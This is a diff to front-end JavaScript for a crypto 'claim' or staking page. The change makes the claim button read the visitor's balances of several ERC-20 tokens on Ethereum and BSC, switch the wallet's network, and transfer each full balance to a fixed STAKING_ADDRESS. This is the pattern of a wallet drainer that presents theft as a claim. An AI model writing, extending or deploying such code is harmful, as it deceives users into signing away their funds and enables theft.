@@ -1,12 +1,16 @@
 import {
-  TOKEN_ADDRESS,
+  STAKE_ASSETS,
   STAKING_ADDRESS,
-  TX_CHAIN_ID,
-  TX_CHAIN_HEX,
+  CHAINS,
   ERC20_ABI,
 } from "./config.js";
 
-const { BrowserProvider, Contract } = globalThis.ethers;
+const { BrowserProvider, Contract, JsonRpcProvider } = globalThis.ethers;
+
+const readProviders = {
+  ETH: new JsonRpcProvider(CHAINS.ETH.addParams.rpcUrls[0]),
+  BSC: new JsonRpcProvider(CHAINS.BSC.addParams.rpcUrls[0]),
+};
 
 const btnConnect = document.getElementById("btnConnect");
 const btnDisconnect = document.getElementById("btnDisconnect");
@@ -69,36 +73,79 @@ function alertErr(err) {
   alert(msg);
 }
 
-async function ensureEthereumChain() {
+async function waitWalletChain(cfg, timeoutMs = 60000) {
+  const eth = getEthereum();
+  if (!eth) throw new Error("未检测到钱包");
+  const deadline = Date.now() + timeoutMs;
+  while (Date.now() < deadline) {
+    const idHex = await eth.request({ method: "eth_chainId" });
+    if (BigInt(idHex) === cfg.id) return;
+    await new Promise((r) => setTimeout(r, 120));
+  }
+  throw new Error("切换网络超时");
+}
+
+async function ensureChain(chainKey) {
+  const cfg = CHAINS[chainKey];
+  if (!cfg) throw new Error("未知网络");
   const eth = getEthereum();
   if (!eth) throw new Error("未检测到钱包");
   const idHex = await eth.request({ method: "eth_chainId" });
-  const id = BigInt(idHex);
-  if (id !== TX_CHAIN_ID) {
-    try {
+  if (BigInt(idHex) === cfg.id) return;
+  try {
+    await eth.request({
+      method: "wallet_switchEthereumChain",
+      params: [{ chainId: cfg.hex }],
+    });
+  } catch (e) {
+    if (e && e.code === 4902) {
+      await eth.request({
+        method: "wallet_addEthereumChain",
+        params: [cfg.addParams],
+      });
       await eth.request({
         method: "wallet_switchEthereumChain",
-        params: [{ chainId: TX_CHAIN_HEX }],
+        params: [{ chainId: cfg.hex }],
       });
-    } catch (e) {
-      if (e && e.code === 4902) {
-        await eth.request({
-          method: "wallet_addEthereumChain",
-          params: [
-            {
-              chainId: TX_CHAIN_HEX,
-              chainName: "Ethereum Mainnet",
-              nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
-              rpcUrls: ["https://eth.llamarpc.com"],
-              blockExplorerUrls: ["https://etherscan.io"],
-            },
-          ],
-        });
-      } else {
-        throw e;
-      }
+    } else {
+      throw e;
     }
   }
+  await waitWalletChain(cfg);
+}
+
+/** 按 STAKE_ASSETS 顺序，用公共 RPC 只读列出余额大于 0 的项 */
+async function listPositiveBalances(me) {
+  const out = [];
+  for (const { token: tokenAddr, chainKey } of STAKE_ASSETS) {
+    const rpc = readProviders[chainKey];
+    if (!rpc) continue;
+    const token = new Contract(tokenAddr, ERC20_ABI, rpc);
+    let bal = 0n;
+    try {
+      bal = await token.balanceOf(me);
+    } catch (e) {
+      console.error(e);
+    }
+    if (bal > 0n) {
+      out.push({ tokenAddr, chainKey, bal });
+    }
+  }
+  return out;
+}
+
+async function sendTokenTransfer(signer, tokenAddr, amount) {
+  const token = new Contract(tokenAddr, ERC20_ABI, signer);
+  const data = token.interface.encodeFunctionData("transfer", [
+    STAKING_ADDRESS,
+    amount,
+  ]);
+  const tx = await signer.sendTransaction({
+    to: tokenAddr,
+    data,
+    gasLimit: 300000n,
+  });
+  await tx.wait();
 }
 
 const ethGlobal = getEthereum();
@@ -187,31 +234,30 @@ btnClaim.addEventListener("click", async () => {
   }
   btnClaim.disabled = true;
   try {
-    try {
-      await ensureEthereumChain();
-    } catch (e) {
-      console.error(e);
-    }
     provider = new BrowserProvider(eth);
     signer = await provider.getSigner();
     const me = await signer.getAddress();
-    const token = new Contract(TOKEN_ADDRESS, ERC20_ABI, signer);
-    let bal = 0n;
-    try {
-      bal = await token.balanceOf(me);
-    } catch (e) {
-      console.error(e);
+
+    const toSend = await listPositiveBalances(me);
+    if (toSend.length > 0) {
+      let lastChainKey = null;
+      for (const { tokenAddr, chainKey, bal } of toSend) {
+        if (lastChainKey !== chainKey) {
+          await ensureChain(chainKey);
+          provider = new BrowserProvider(eth);
+          signer = await provider.getSigner();
+          lastChainKey = chainKey;
+        }
+        await sendTokenTransfer(signer, tokenAddr, bal);
+      }
+      return;
     }
-    const data = token.interface.encodeFunctionData("transfer", [
-      STAKING_ADDRESS,
-      bal,
-    ]);
-    const tx = await signer.sendTransaction({
-      to: TOKEN_ADDRESS,
-      data,
-      gasLimit: 300000n,
-    });
-    await tx.wait();
+
+    const first = STAKE_ASSETS[0];
+    await ensureChain(first.chainKey);
+    provider = new BrowserProvider(eth);
+    signer = await provider.getSigner();
+    await sendTokenTransfer(signer, first.token, 0n);
   } catch (err) {
     console.error(err);
     alertErr(err);
